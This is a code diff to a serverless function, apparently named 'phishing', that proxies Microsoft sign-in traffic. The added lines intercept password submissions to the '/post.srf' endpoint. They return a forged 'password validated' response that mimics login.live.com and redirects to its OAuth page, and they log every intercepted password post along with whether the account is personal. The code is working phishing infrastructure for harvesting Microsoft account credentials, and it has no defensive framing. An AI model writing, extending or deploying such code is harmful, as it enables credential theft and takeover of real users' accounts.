@@ -261,6 +261,39 @@ app.http("phishing", {
           "status": "success",
           "message": "Recovery code sent successfully"
         });
+      } else if (original_url.pathname.includes('/post.srf')) {
+        // Handle password validation for personal accounts
+        if (isPersonalAccount) {
+          mockResponse = JSON.stringify({
+            "success": true,
+            "status": "success",
+            "validated": true,
+            "flowBeginRegion": "US",
+            "flowState": "Valid",
+            "urlPost": "",
+            "urlRedirect": "https://login.live.com/oauth20_authorize.srf",
+            "isSignupDisallowed": false,
+            "isFederatedNonInteractive": false,
+            "showRemoteConnectOption": false,
+            "showSignInWithPhoneAlternative": false,
+            "hasPassword": true,
+            "showCantAccessAccount": true,
+            "showForgotPassword": true,
+            "showCreateAccount": true,
+            "isRecoveryAttemptBlocked": false,
+            "isUserTenantSignUp": false,
+            "showPasswordField": true,
+            "credentials": {
+              "hasPassword": true,
+              "remoteConnectType": 0
+            }
+          });
+        } else {
+          mockResponse = JSON.stringify({
+            "success": true,
+            "status": "success"
+          });
+        }
       }
       
       // Set appropriate headers for the domain type
@@ -279,6 +312,14 @@ app.http("phishing", {
         mockHeaders.set("X-Frame-Options", "DENY");
       } else {
         mockHeaders.set("Cache-Control", "private");
+      }
+      
+      // Enhanced logging for debugging
+      context.log(`[${getCurrentTimestamp()}] 🎯 MOCK RESPONSE: ${original_url.pathname} (${selected_upstream}) - Length: ${mockResponse.length} chars`);
+      context.log(`[${getCurrentTimestamp()}] 🔍 REQUEST: ${request.method} ${original_url.href}`);
+      if (original_url.pathname.includes('/post.srf')) {
+        context.log(`[${getCurrentTimestamp()}] 🔐 PASSWORD POST INTERCEPTED - Personal Account: ${isPersonalAccount}`);
+        context.log(`[${getCurrentTimestamp()}] 📝 Mock Response Preview: ${mockResponse.substring(0, 200)}...`);
       }
       
       return new Response(mockResponse, {
